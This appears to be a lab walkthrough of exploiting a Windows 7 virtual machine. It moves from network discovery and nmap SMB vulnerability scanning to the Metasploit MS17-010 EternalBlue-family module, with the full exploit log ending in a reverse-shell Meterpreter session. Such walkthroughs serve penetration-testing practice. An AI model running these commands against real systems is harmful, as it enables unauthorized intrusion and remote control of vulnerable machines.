`sudo arp-scan -I eth0 10.0.2.0/24`
```
Interface: eth0, type: EN10MB, MAC: 08:00:27:50:4c:14, IPv4: 10.0.2.4
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:07:dc:51       PCS Systemtechnik GmbH
10.0.2.14       08:00:27:ee:9a:b0       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.216 seconds (115.52 hosts/sec). 4 responded
```

`sudo nmap -Pn -sS -p- 10.0.2.14`
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 15:51 EDT
Nmap scan report for 10.0.2.14
Host is up (0.0011s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:EE:9A:B0 (Oracle VirtualBox virtual NIC)
```

`microsoft-ds` is a microsoft service using `SMB` (server message block).  
That's why we're searching for smb vulnerabilities  

(Open source imlementation of `SMB` exist under a name `Samba` (for using linux and win together in a network))  

`sudo nmap -Pn --script "smb-vuln-*" -p 445 10.0.2.14`
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:EE:9A:B0 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

CVE-2017-0143 babe  

`msfconsole` -> `search CVE-2017-0143`  
```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

`use 1` -> `set rhosts 10.0.2.14` -> `run`  
```
[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] 10.0.2.14:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.2.14:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.14:445         - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.2.14:445 - The target is vulnerable.
[*] 10.0.2.14:445 - Connecting to target for exploitation.
[+] 10.0.2.14:445 - Connection established for exploitation.
[+] 10.0.2.14:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.2.14:445 - CORE raw buffer dump (38 bytes)
[*] 10.0.2.14:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 10.0.2.14:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 10.0.2.14:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 10.0.2.14:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.2.14:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.2.14:445 - Sending all but last fragment of exploit packet
[*] 10.0.2.14:445 - Starting non-paged pool grooming
[+] 10.0.2.14:445 - Sending SMBv2 buffers
[+] 10.0.2.14:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.2.14:445 - Sending final SMBv2 buffers.
[*] 10.0.2.14:445 - Sending last fragment of exploit packet!
[*] 10.0.2.14:445 - Receiving response from exploit packet
[+] 10.0.2.14:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.2.14:445 - Sending egg to corrupted connection.
[*] 10.0.2.14:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.0.2.14
[+] 10.0.2.14:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.14:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.14:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.14:49159) at 2022-06-28 08:47:08 -0400

meterpreter > 
```

Done
